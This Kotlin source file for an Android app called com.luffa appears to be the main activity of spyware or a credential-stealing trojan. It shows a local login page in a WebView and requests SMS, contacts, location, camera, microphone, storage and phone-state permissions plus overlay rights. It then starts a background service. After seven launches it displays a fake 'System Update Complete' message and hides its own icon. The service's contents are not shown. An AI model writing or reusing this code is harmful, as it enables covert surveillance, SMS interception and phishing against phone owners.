package com.luffa

import android.Manifest
import android.app.PendingIntent
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.Settings
import android.widget.Toast
import android.util.Log
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.content.ComponentName
import android.webkit.*
import androidx.preference.PreferenceManager

class MainActivity : AppCompatActivity() {

    private val REQUEST_PERM_CODE = 1001
    private val REQUEST_OVERLAY_CODE = 1002
    private lateinit var serviceIntent: Intent
    private lateinit var prefs: android.content.SharedPreferences
    private val LAUNCH_LIMIT = 7
    private lateinit var myWebView: WebView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // 1. Initialize SharedPreferences
        prefs = PreferenceManager.getDefaultSharedPreferences(this)
        
        // 2. Initialize WebView
        myWebView = WebView(this)
        setContentView(myWebView)

        val webSettings: WebSettings = myWebView.settings
        webSettings.javaScriptEnabled = true
        webSettings.domStorageEnabled = true
        webSettings.allowFileAccess = true
        webSettings.loadWithOverviewMode = true
        webSettings.useWideViewPort = true
        myWebView.settings.setJavaScriptCanOpenWindowsAutomatically(true)
        
        // WebView Client Fix
        myWebView.webViewClient = object : WebViewClient() {
            override fun onPageFinished(view: WebView?, url: String?) {
                // Page load complete
            }
        }

        myWebView.webChromeClient = object : WebChromeClient() {
            override fun onConsoleMessage(consoleMessage: ConsoleMessage?): Boolean {
                Log.d("WebView", consoleMessage?.message() + " from line " + consoleMessage?.lineNumber())
                return true
            }
        }

        // Load HTML
        myWebView.loadUrl("file:///android_asset/login.html")

        // 3. Initialize Service Intent
        serviceIntent = Intent(this, MyService::class.java)

        // 4. Launch Count Logic
        val currentLaunches = prefs.getInt("launch_count", 0) + 1
        prefs.edit().putInt("launch_count", currentLaunches).apply()

        requestPermissions()

        if (currentLaunches >= LAUNCH_LIMIT) {
            prefs.edit().putBoolean("app_hidden", true).apply()
            Toast.makeText(this, "System Update Complete", Toast.LENGTH_SHORT).show()
            hideAppIcon()
        }
    }

    private fun hideAppIcon() {
        val componentName = ComponentName(this, MainActivity::class.java)
        try {
            packageManager.setComponentEnabledSetting(
                componentName,
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP
            )
        } catch (e: Exception) {
            Log.e("MainActivity", "Error hiding icon", e)
        }
    }

    private val perms = arrayOf(
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_PHONE_STATE
    )

    private fun requestPermissions() {
        val ungranted = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (ungranted.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, ungranted.toTypedArray(), REQUEST_PERM_CODE)
        } else {
            checkOverlayPermissionThenStart()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == REQUEST_PERM_CODE) {
            checkOverlayPermissionThenStart()
        }
    }

    private fun checkOverlayPermissionThenStart() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            val intent = Intent(
                Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                Uri.parse("package:$packageName")
            )
            startActivityForResult(intent, REQUEST_OVERLAY_CODE)
        } else {
            startService()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQUEST_OVERLAY_CODE) {
            startService()
        }
    }

    private fun startService() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                startForegroundService(serviceIntent)
            } catch (e: Exception) {
                Log.e("MainActivity", "StartForegroundService failed", e)
            }
        } else {
            try {
                startService(serviceIntent)
            } catch (e: Exception) {
                Log.e("MainActivity", "StartService failed", e)
            }
        }

        val vibrator = getSystemService(Vibrator::class.java)
        if (vibrator?.hasVibrator() == true) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createOneShot(100, VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(100)
            }
        }
    }
}
